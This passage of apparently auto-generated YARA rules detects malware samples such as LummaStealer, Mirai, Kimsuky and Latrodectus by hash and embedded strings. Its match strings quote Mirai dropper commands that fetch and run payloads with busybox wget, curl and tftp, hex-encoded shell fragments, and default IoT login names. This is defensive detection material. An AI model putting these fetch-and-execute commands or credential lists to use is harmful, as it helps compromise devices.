      description = "_subset_batch - from files HijackLoader(signature)_00efed44c47255dff78fbfc7f266ee4b(imphash).exe, LummaStealer(signature)_2cfee53aeb00cd14e32ccbca525e1ea5(imphash).dll, MilleniumRAT(signature)_bfc94987b9a21a61fae666713d43dafc(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6303338d410eb13056a6667bb03f1ed394bb8c9defb8315aa87aa2db4e01a9f1"
      hash2 = "3ecf6bbee75710b183deee7f671826f78da55f9f773c1c46b14b2c53bdfe67ce"
      hash3 = "73607f1799be5facd81d484fa6b1f6518378037ef16c32eaa0c562ff49c1e0b5"
   strings:
      $s1 = "%s: \"%s\" - should this be a string literal in single-quotes?" fullword ascii /* score: '17.50'*/
      $s2 = "Failed to read ptrmap key=%u" fullword ascii /* score: '13.00'*/
      $s3 = "max rootpage (%u) disagrees with header (%u)" fullword ascii /* score: '12.00'*/
      $s4 = "failed to get page %u" fullword ascii /* score: '12.00'*/
      $s5 = "hex literal too big: %s%#T" fullword ascii /* score: '11.00'*/
      $s6 = "IN(...) element has %d term%s - expected %d" fullword ascii /* score: '10.00'*/
      $s7 = "SELECT 1 FROM temp.sqlite_master WHERE name NOT LIKE 'sqliteX_%%' ESCAPE 'X' AND sql NOT LIKE 'create virtual%%' AND sqlite_rena" ascii /* score: '10.00'*/
      $s8 = "unrecognized token: \"%s\"" fullword ascii /* score: '10.00'*/
      $s9 = "unknown datatype for %s.%s: \"%s\"" fullword ascii /* score: '9.50'*/
      $s10 = "me_test(%Q, sql, type, name, %d, %Q, %d)=NULL " fullword ascii /* score: '9.50'*/
      $s11 = "Bad ptr map entry key=%u expected=(%u,%u) got=(%u,%u)" fullword ascii /* score: '9.50'*/
      $s12 = "flexnum" fullword ascii /* score: '8.00'*/
      $s13 = "unknown join type: %T%s%T%s%T" fullword ascii /* score: '8.00'*/
      $s14 = "HERE quick_check GLOB 'CHECK*' OR quick_check GLOB 'NULL*' OR quick_check GLOB 'non-* value in*'" fullword ascii /* score: '8.00'*/
      $s15 = "notused" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Kimsuky_signature__b66e456457142424c4274ccc4a6e3326_imphash__LummaStealer_signature__4035d2883e01d64f3e7a9dccb1d63af5_impha_53 {
   meta:
      description = "_subset_batch - from files Kimsuky(signature)_b66e456457142424c4274ccc4a6e3326(imphash).exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_34a2697f.exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash)_1d9bd7df.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_d20503a6.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_ea37de23.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "84f4f2e77b6e59c1fe54360842821fbfc6cdab039f197147b30876ed7da3647c"
      hash2 = "8297cd00e6dd7a00a075bcb618e9864632fe1aeca0f15cd630f1e7d665d262b2"
      hash3 = "34a2697f63fe5c7752c039edbc7acae72858be60ff3e13b0109872bca01f4809"
      hash4 = "bde9b8b30e8700d3c2759ef0792a3d556063e78670ee31ef19676e5a1a1861cf"
      hash5 = "1d9bd7dfac193a4dfab75e59091f93b2a46232a7a461a6af02b0dddb0b509346"
      hash6 = "f37b9940d7ab8158b62bd0ca600cde35dffc36d64f5820931de7da9626fbe478"
      hash7 = "d20503a6c683c4cfddc10051531db2ab1b43be7d1b786d71f65938ce84812bbe"
      hash8 = "ea37de23a99f57a12361c094bfedc9cb91356f1d729a313ae68fcb86febf5701"
   strings:
      $s1 = "sync.(*Mutex).lockSlow" fullword ascii /* score: '15.00'*/
      $s2 = "sync.(*Mutex).unlockSlow" fullword ascii /* score: '15.00'*/
      $s3 = "errors.New" fullword ascii /* score: '13.00'*/
      $s4 = "runtime.int64Hash" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.addOneOpenDeferFrame.func1" fullword ascii /* score: '13.00'*/
      $s6 = "runtime.addOneOpenDeferFrame" fullword ascii /* score: '13.00'*/
      $s7 = "runtime.addOneOpenDeferFrame.func1.1" fullword ascii /* score: '13.00'*/
      $s8 = "runtime.runOpenDeferFrame" fullword ascii /* score: '13.00'*/
      $s9 = "framepc" fullword ascii /* score: '11.00'*/
      $s10 = "runtime.hasPrefix" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.goPanicSlice3AlenU" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.doaddtimer" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.clearDeletedTimers" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.cfuncnameFromNameoff" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.resettimer" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__06c01162_Mirai_signature__080f8516_54 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_06c01162.elf, Mirai(signature)_080f8516.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "06c01162dde461f244426e7370b79b92193f6fce1d608df53079162c7f244ab6"
      hash2 = "080f8516fee3ad02b1a7058f5725efcd1adcf1acb906c0124eb6fbcc2f3c6c50"
   strings:
      $s1 = "cd %s && tftp -g -r %s %s" fullword ascii /* score: '23.00'*/
      $s2 = "ftpget -v -u anonymous -p anonymous -P 21 %s %s %s" fullword ascii /* score: '20.00'*/
      $s3 = "tftp %s -c get %s %s" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://%s/%s/%s -O %s" fullword ascii /* score: '19.00'*/
      $s5 = "curl -o %s http://%s/%s/%s" fullword ascii /* score: '18.00'*/
      $s6 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9" fullword ascii /* score: '12.00'*/
      $s7 = "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s8 = "/usr/sbin/tftp" fullword ascii /* score: '12.00'*/
      $s9 = "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s10 = "/usr/sbin/rsyslogd" fullword ascii /* score: '12.00'*/
      $s11 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12" fullword ascii /* score: '12.00'*/
      $s12 = "/usr/sbin/ftpget" fullword ascii /* score: '12.00'*/
      $s13 = "/usr/sbin/wget" fullword ascii /* score: '12.00'*/
      $s14 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17" fullword ascii /* score: '12.00'*/
      $s15 = "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Kimsuky_signature__b66e456457142424c4274ccc4a6e3326_imphash__LummaStealer_signature__1aae8bf580c846f39c71c05898e57e88_impha_55 {
   meta:
      description = "_subset_batch - from files Kimsuky(signature)_b66e456457142424c4274ccc4a6e3326(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_1f8a0a52.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "84f4f2e77b6e59c1fe54360842821fbfc6cdab039f197147b30876ed7da3647c"
      hash2 = "ec1bf2523cc8eedddae9d7d4c657f210886b9f4cb085858310d97be8dd90b33f"
      hash3 = "1f8a0a528ce10785f929770fd9b1a3bb4d02f9f187ec0f7aab701b7a252c7099"
   strings:
      $s1 = "runtime.(*activeSweep).end" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.gcPaceSweeper" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.expandCgoFrames" fullword ascii /* score: '13.00'*/
      $s4 = "runtime.(*activeSweep).sweepers" fullword ascii /* score: '12.00'*/
      $s5 = "runtime.(*activeSweep).reset" fullword ascii /* score: '12.00'*/
      $s6 = "runtime.(*activeSweep).isDone" fullword ascii /* score: '12.00'*/
      $s7 = "runtime.(*activeSweep).markDrained" fullword ascii /* score: '12.00'*/
      $s8 = "runtime.(*activeSweep).begin" fullword ascii /* score: '12.00'*/
      $s9 = "*[]runtime.Frame" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.isInf" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.(*Frames).Next" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.stkobjinit" fullword ascii /* score: '10.00'*/
      $s13 = "*[2]runtime.Frame" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.funcInfo.entry" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.gostring" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Kimsuky_signature__b66e456457142424c4274ccc4a6e3326_imphash__LummaStealer_signature__1aae8bf580c846f39c71c05898e57e88_impha_56 {
   meta:
      description = "_subset_batch - from files Kimsuky(signature)_b66e456457142424c4274ccc4a6e3326(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_1f8a0a52.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_d20503a6.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_ea37de23.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "84f4f2e77b6e59c1fe54360842821fbfc6cdab039f197147b30876ed7da3647c"
      hash2 = "ec1bf2523cc8eedddae9d7d4c657f210886b9f4cb085858310d97be8dd90b33f"
      hash3 = "1f8a0a528ce10785f929770fd9b1a3bb4d02f9f187ec0f7aab701b7a252c7099"
      hash4 = "f37b9940d7ab8158b62bd0ca600cde35dffc36d64f5820931de7da9626fbe478"
      hash5 = "d20503a6c683c4cfddc10051531db2ab1b43be7d1b786d71f65938ce84812bbe"
      hash6 = "ea37de23a99f57a12361c094bfedc9cb91356f1d729a313ae68fcb86febf5701"
   strings:
      $s1 = "runtime.(*gcControllerState).commit" fullword ascii /* score: '14.00'*/
      $s2 = "runtime.initLongPathSupport" fullword ascii /* score: '13.00'*/
      $s3 = "runtime.(*sweepLocker).tryAcquire" fullword ascii /* score: '12.00'*/
      $s4 = "runtime.(*sweepLocked).sweep" fullword ascii /* score: '12.00'*/
      $s5 = "runtime.runqdrain" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.gFromSP" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.printArgs.func2" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.sigpanic0" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.goschedguarded_m" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.printArgs" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.forEachG" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.checkIdleGCNoP" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.gcMarkRootCheck.func1" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.readGOGC" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.checkRunqsNoP" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__06dfacf4_Mirai_signature__07325618_57 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_06dfacf4.elf, Mirai(signature)_07325618.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "06dfacf4bb22758e1743be816e982b9af64da11c4889ecf68009469a5e5b1b67"
      hash2 = "07325618a05f2290f28d35fa7cd598f0d0cecc8598ad846880d53193d4c96551"
   strings:
      $s1 = "orf; cd /tmp; /bin/busybox wget http://%s/mipsel; chmod 777 mipsel; ./mipsel selfrep.realtek; /bin/busybox wget http://%s/mips; " ascii /* score: '25.00'*/
      $s2 = "orf; cd /tmp; /bin/busybox wget http://%s/mipsel; chmod 777 mipsel; ./mipsel selfrep.realtek; /bin/busybox wget http://%s/mips; " ascii /* score: '25.00'*/
      $s3 = "cd /tmp || cd /var || cd /dev/shm;wget http://%s/telnet.sh; curl -O http://%s/telnet.sh; chmod 777 telnet.sh; sh telnet.sh; " fullword ascii /* score: '25.00'*/
      $s4 = "[0mPassword: " fullword ascii /* score: '16.00'*/
      $s5 = "Login:" fullword ascii /* score: '12.00'*/
      $s6 = "!shellcmd " fullword ascii /* score: '12.00'*/
      $s7 = "POST / HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s8 = "[0mNo shell available" fullword ascii /* score: '12.00'*/
      $s9 = "login:" fullword ascii /* score: '12.00'*/
      $s10 = "[0mWrong password!" fullword ascii /* score: '12.00'*/
      $s11 = "/command/" fullword ascii /* score: '12.00'*/
      $s12 = "/proc/%s/comm" fullword ascii /* score: '10.00'*/
      $s13 = "!openshell" fullword ascii /* score: '9.00'*/
      $s14 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110" fullword ascii /* score: '9.00'*/
      $s15 = "/fhrom/fhshell/" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__03281c7e_Mirai_signature__03288429_Mirai_signature__0eeb6dc8_58 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_03281c7e.elf, Mirai(signature)_03288429.elf, Mirai(signature)_0eeb6dc8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "03281c7ede8a23dad37b048b45120867df88e30faa380053b083eef1256f8b4d"
      hash2 = "03288429e16438ba16eec99776d665e20cbe68b923e54eb4f1c09e0b51750e20"
      hash3 = "0eeb6dc800721b432a663c4f65834b5d126925e1306bd43c26e655692087bc5c"
   strings:
      $s1 = "tluafed" fullword ascii /* reversed goodware string 'default' */ /* score: '18.00'*/
      $s2 = "User-Agent: Wget" fullword ascii /* score: '17.00'*/
      $s3 = "xirtam" fullword ascii /* reversed goodware string 'matrix' */ /* score: '15.00'*/
      $s4 = "/bin/busybox wget http://" fullword ascii /* score: '15.00'*/
      $s5 = "admintelecom" fullword ascii /* score: '11.00'*/
      $s6 = "/bin/busybox echo -ne " fullword ascii /* score: '11.00'*/
      $s7 = "solokey" fullword ascii /* score: '11.00'*/
      $s8 = "telecomadmin" fullword ascii /* score: '11.00'*/
      $s9 = "supportadmin" fullword ascii /* score: '11.00'*/
      $s10 = "telnetadmin" fullword ascii /* score: '8.00'*/
      $s11 = "hikvision" fullword ascii /* score: '8.00'*/
      $s12 = "unisheen" fullword ascii /* score: '8.00'*/
      $s13 = "wabjtam" fullword ascii /* score: '8.00'*/
      $s14 = "grouter" fullword ascii /* score: '8.00'*/
      $s15 = "root123" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _Latrodectus_signature__Latrodectus_signature__2c362434_Latrodectus_signature__609af7d25feaca5444ebdca982887a37_imphash__Lat_59 {
   meta:
      description = "_subset_batch - from files Latrodectus(signature).msi, Latrodectus(signature)_2c362434.msi, Latrodectus(signature)_609af7d25feaca5444ebdca982887a37(imphash).exe, Latrodectus(signature)_76a27a9ecaaa71f61744ad190a00002a(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f1b27d88bdb6b4d2019191b539f130edceb6b7ec16bd4131159256b4c872a8fd"
      hash2 = "2c3624344070c78c0785b5e833c0d56a5cec3f5e58ce53b9c17018d9386b7f37"
      hash3 = "f55df05f07ac4c0be0bcfd0815df4643ffc8aa3592253dbdbf110df978653542"
      hash4 = "5ef4165814a06f164cec6f6323d11bf62d7934a61c2b992fc47ca5319d3e9373"
   strings:
      $s1 = "Ehttp://www.ssl.com/repository/SSLcomRootCertificationAuthorityRSA.crt0 " fullword ascii /* score: '19.00'*/
      $s2 = "http://ocsps.ssl.com0?" fullword ascii /* score: '17.00'*/
      $s3 = "5http://cert.ssl.com/SSL.com-timeStamping-I-RSA-R1.cer0Q" fullword ascii /* score: '17.00'*/
      $s4 = "http://ocsps.ssl.com0P" fullword ascii /* score: '17.00'*/
      $s5 = "!SSL.com Timestamping Unit 2024 E10Y0" fullword ascii /* score: '17.00'*/
      $s6 = ".SSL.com EV Root Certification Authority RSA R20" fullword ascii /* score: '16.00'*/
      $s7 = "4http://crls.ssl.com/SSLcom-RootCA-EV-RSA-4096-R2.crl0" fullword ascii /* score: '16.00'*/
      $s8 = ">http://www.ssl.com/repository/SSLcom-RootCA-EV-RSA-4096-R2.crt0 " fullword ascii /* score: '16.00'*/
      $s9 = "&SSL.com Timestamping Issuing RSA CA R1" fullword ascii /* score: '13.00'*/
      $s10 = "?http://crls.ssl.com/SSLcom-SubCA-EV-CodeSigning-RSA-4096-R3.crl0" fullword ascii /* score: '13.00'*/
      $s11 = "5http://crls.ssl.com/SSL.com-timeStamping-I-RSA-R1.crl0" fullword ascii /* score: '13.00'*/
      $s12 = "?http://cert.ssl.com/SSLcom-SubCA-EV-CodeSigning-RSA-4096-R3.cer0 " fullword ascii /* score: '13.00'*/
      $s13 = "&SSL.com Timestamping Issuing RSA CA R10" fullword ascii /* score: '13.00'*/
      $s14 = ".SSL.com EV Code Signing Intermediate CA RSA R30" fullword ascii /* score: '12.00'*/
      $s15 = ".SSL.com EV Code Signing Intermediate CA RSA R3" fullword ascii /* score: '12.00'*/
   condition:
      ( ( uint16(0) == 0xcfd0 or uint16(0) == 0x5a4d ) and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__91802a615b3a5c4bcc05bc5f66a5b219_imphash__LummaStealer_signature__91802a615b3a5c4bcc05bc5f66a5b219__60 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash)_1d9bd7df.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_93b67e92.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bde9b8b30e8700d3c2759ef0792a3d556063e78670ee31ef19676e5a1a1861cf"
      hash2 = "1d9bd7dfac193a4dfab75e59091f93b2a46232a7a461a6af02b0dddb0b509346"
      hash3 = "852fd8e572f18ab2f694153a8943c2ef198c2a5bf6179e7bef30c6dc79f84811"
      hash4 = "93b67e925e2b9bfe548c1437a40bc558b2b598f5f9c40c34c7c372814e8b89f4"
   strings:
      $s1 = "dex out of rangeinput/output errormultihop attemptedno child processesno locks availableoperation canceledruntime.semacreaterunt" ascii /* score: '26.00'*/
      $s2 = "gcControllerState.findRunnable: blackening not enabledno goroutines (main called runtime.Goexit) - deadlock!runtime: GetQueuedCo" ascii /* score: '22.00'*/
      $s3 = "gcControllerState.findRunnable: blackening not enabledno goroutines (main called runtime.Goexit) - deadlock!runtime: GetQueuedCo" ascii /* score: '19.00'*/
      $s4 = "tUserNameExWMB; allocated NetUserGetInfoProcess32NextWSetFilePointerTranslateNameWallocfreetracebad allocCountbad span statebad " ascii /* score: '19.00'*/
      $s5 = "ableno message of desired typenotewakeup - double wakeupout of memory (stackalloc)persistentalloc: size == 0required key not ava" ascii /* score: '15.00'*/
      $s6 = "e busytoo many linkstoo many userswinapi error #work.full != 0  with GC prog" fullword ascii /* score: '15.00'*/
      $s7 = "casfrom_Gscanstatus:top gp->status is not in scan stategentraceback callback cannot be used with non-zero skipnewproc: function " ascii /* score: '14.00'*/
      $s8 = " *( -  <  >  m=%: ???NaNPC=]:" fullword ascii /* score: '12.00'*/
      $s9 = "as _GCmarkterminationgentraceback cannot trace user goroutine on its own stackruntime:stoplockedm: g is not Grunnable or Gscanru" ascii /* score: '11.00'*/
      $s10 = "runtime.printeface" fullword ascii /* score: '10.00'*/
      $s11 = "anfreedefer with d.fn != nilinitSpan: unaligned lengthinvalid request descriptorname not unique on networkno CSI structure avail" ascii /* score: '10.00'*/
      $s12 = "bad lfnode addressbad manualFreeListconnection refusedfile name too longforEachP: not donegarbage collectionidentifier removedin" ascii /* score: '10.00'*/
      $s13 = "runtime.typestring" fullword ascii /* score: '10.00'*/
      $s14 = ".lib section in a.out corruptedbad write barrier buffer boundscall from within the Go runtimecannot assign requested addresscasg" ascii /* score: '9.00'*/
      $s15 = "adxaesavxendfmagc gp nilobjpc= <== at  fp= is  lr: of  pc= sp: sp=) = ) m=+Inf, n -Inf: p=GOGC" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__03288429_Mirai_signature__0eeb6dc8_61 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_03288429.elf, Mirai(signature)_0eeb6dc8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "03288429e16438ba16eec99776d665e20cbe68b923e54eb4f1c09e0b51750e20"
      hash2 = "0eeb6dc800721b432a663c4f65834b5d126925e1306bd43c26e655692087bc5c"
   strings:
      $s1 = "/t/wget.sh -O- | sh;curl http://" fullword ascii /* score: '20.00'*/
      $s2 = "/t/curl.sh -o- | sh" fullword ascii /* score: '12.00'*/
      $s3 = "/bin/busybox echo -ne \"\\x71\\x20\\x22\\x24\\x70\\x69\\x64\\x22\\x20\\x5D\\x20\\x32\\x3E\\x20\\x2F\\x64\\x65\\x76\\x2F\\x6E\\x7" ascii /* score: '11.00'*/
      $s4 = "/bin/busybox rm -rf .ntpf .k" fullword ascii /* score: '11.00'*/
      $s5 = "/bin/busybox echo -ne \"\\x71\\x20\\x22\\x64\\x76\\x72\\x48\\x65\\x6C\\x70\\x65\\x72\\x22\\x3B\\x20\\x74\\x68\\x65\\x6E\\x0A\\x2" ascii /* score: '11.00'*/
      $s6 = "/bin/busybox echo -ne \"\\x23\\x21\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x0A\\x0A\\x66\\x6F\\x72\\x20\\x70\\x72\\x6F\\x63\\x5F\\x6" ascii /* score: '11.00'*/
      $s7 = "/bin/busybox echo -ne \"\\x69\\x6E\\x75\\x65\\x0A\\x20\\x20\\x66\\x69\\x0A\\x0A\\x20\\x20\\x23\\x20\\x47\\x65\\x74\\x20\\x74\\x6" ascii /* score: '11.00'*/
      $s8 = "/bin/busybox echo -ne \"\\x20\\x43\\x68\\x65\\x63\\x6B\\x20\\x69\\x66\\x20\\x74\\x68\\x65\\x20\\x63\\x6F\\x6D\\x6D\\x61\\x6E\\x6" ascii /* score: '11.00'*/
      $s9 = "/bin/busybox echo -ne \"\\x6E\\x75\\x6D\\x65\\x72\\x69\\x63\\x20\\x64\\x69\\x72\\x65\\x63\\x74\\x6F\\x72\\x69\\x65\\x73\\x0A\\x2" ascii /* score: '11.00'*/
      $s10 = "/bin/busybox echo -ne \"\\x71\\x20\\x22\\x64\\x76\\x72\\x48\\x65\\x6C\\x70\\x65\\x72\\x22\\x3B\\x20\\x74\\x68\\x65\\x6E\\x0A\\x2" ascii /* score: '11.00'*/
      $s11 = "/bin/busybox echo -ne \"\\x23\\x21\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x0A\\x0A\\x66\\x6F\\x72\\x20\\x70\\x72\\x6F\\x63\\x5F\\x6" ascii /* score: '11.00'*/
      $s12 = "/bin/busybox echo -ne \"\\x76\\x72\\x48\\x65\\x6C\\x70\\x65\\x72\\x22\\x0A\\x20\\x20\\x69\\x66\\x20\\x65\\x63\\x68\\x6F\\x20\\x2" ascii /* score: '11.00'*/
      $s13 = "/bin/busybox echo -ne \"\\x6E\\x75\\x6D\\x65\\x72\\x69\\x63\\x20\\x64\\x69\\x72\\x65\\x63\\x74\\x6F\\x72\\x69\\x65\\x73\\x0A\\x2" ascii /* score: '11.00'*/
      $s14 = "/bin/busybox echo -ne \"\\x20\\x43\\x68\\x65\\x63\\x6B\\x20\\x69\\x66\\x20\\x74\\x68\\x65\\x20\\x63\\x6F\\x6D\\x6D\\x61\\x6E\\x6" ascii /* score: '11.00'*/
      $s15 = "/bin/busybox echo -ne \"\\x20\\x20\\x70\\x69\\x64\\x3D\\x24\\x7B\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x23\\x23\\x2A\\x2F\\x7" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__088470f5_Mirai_signature__0dcc610d_62 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_088470f5.elf, Mirai(signature)_0dcc610d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "088470f5f25162d59dd65abb5b3c7af058fe849bd99ed91549435bdffdfb7fd5"
      hash2 = "0dcc610d67812ddfa3a937ca671eafca52ee154b9b25244a677983f870a50f43"
   strings:
      $s1 = "[huawei] FD%d exploit_stage=2. sending POST /ctrlt/DeviceUpgrade_1 to %d.%d.%d.%d" fullword ascii /* score: '20.00'*/
      $s2 = "[main] Failed to connect to fd_ctrl to request process termination" fullword ascii /* score: '18.00'*/
      $s3 = "[huawei] scanner process initiated. starting scanner" fullword ascii /* score: '16.00'*/
      $s4 = "[killer] Finding and killing processes holding port %d" fullword ascii /* score: '15.00'*/
      $s5 = "[main] We are the only process on this system!" fullword ascii /* score: '15.00'*/
      $s6 = "[huawei] FD%d exploit_stage=1. connection to %d.%d.%d.%d successful. proceeding to stage 2" fullword ascii /* score: '14.00'*/
      $s7 = "[main] Lost connection with CNC (errno: %d, stat: 2)" fullword ascii /* score: '12.50'*/
      $s8 = "[main] Lost connection with CNC (errno: %d, stat: 1)" fullword ascii /* score: '12.50'*/
      $s9 = "[main]: lost connection with CNC (errno: %d, stat: 1)" fullword ascii /* score: '12.50'*/
      $s10 = "[main]: Lost connection with CNC (errno: %d, stat: 2)" fullword ascii /* score: '12.50'*/
      $s11 = "[main] Attempting to connect to CNC" fullword ascii /* score: '11.00'*/
      $s12 = "[huawei] FD%d exploit_stage=3. closing connection" fullword ascii /* score: '11.00'*/
      $s13 = "[killer] Found pid %d for port %d" fullword ascii /* score: '10.00'*/
      $s14 = "Found inode \"%s\" for port %d" fullword ascii /* score: '10.00'*/
      $s15 = "Failed to find inode for port %d" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _Kimsuky_signature__b66e456457142424c4274ccc4a6e3326_imphash__LummaStealer_signature__91802a615b3a5c4bcc05bc5f66a5b219_impha_63 {
   meta:
      description = "_subset_batch - from files Kimsuky(signature)_b66e456457142424c4274ccc4a6e3326(imphash).exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash)_1d9bd7df.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "84f4f2e77b6e59c1fe54360842821fbfc6cdab039f197147b30876ed7da3647c"
      hash2 = "bde9b8b30e8700d3c2759ef0792a3d556063e78670ee31ef19676e5a1a1861cf"
      hash3 = "1d9bd7dfac193a4dfab75e59091f93b2a46232a7a461a6af02b0dddb0b509346"
   strings:
      $s1 = "l32.dll" fullword ascii /* score: '20.00'*/
      $s2 = "i32.dll" fullword ascii /* score: '20.00'*/
      $s3 = "rof.dll" fullword ascii /* score: '20.00'*/
      $s4 = "_32.dll" fullword ascii /* score: '17.00'*/
      $s5 = "SystemFuH" fullword ascii /* base64 encoded string */ /* score: '17.00'*/
      $s6 = "ntdll.dlH" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.(*pageAlloc).sysGrow.func2" fullword ascii /* score: '11.00'*/
      $s8 = "runtime.(*pageAlloc).sysGrow.func1" fullword ascii /* score: '11.00'*/
      $s9 = "runtime.(*pageAlloc).sysGrow.func3" fullword ascii /* score: '11.00'*/
      $s10 = "runtime.chunkIdx.l1" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.convT64" fullword ascii /* score: '10.00'*/
      $s12 = "winmm.dlH" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.chunkIdx.l2" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.addrRange.subtract" fullword ascii /* score: '10.00'*/
